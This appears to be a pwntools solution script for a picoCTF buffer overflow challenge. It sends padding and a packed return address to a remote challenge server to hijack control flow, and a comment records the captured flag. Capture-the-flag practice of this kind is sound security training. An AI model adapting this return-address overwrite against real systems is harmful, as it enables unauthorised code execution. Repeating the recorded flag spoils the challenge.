from pwn import *

def main():
    LOCAL = False
    if LOCAL == True:
        p = process('./vuln')
    else:
        p = remote('saturn.picoctf.net', 55730)

    payload = b"A" * 32 + b"B" * 12 + p32(0x080491f6)
    print("Payload: ", payload)
    l = p.recvuntil(b'string:')
    print(l)
    p.sendline(payload)

    print(p.recvline())
    print(p.recvline())
    print(p.interactive())

    # Flag: picoCTF{addr3ss3s_ar3_3asy_c76b273b}


if __name__ == '__main__':
    main()
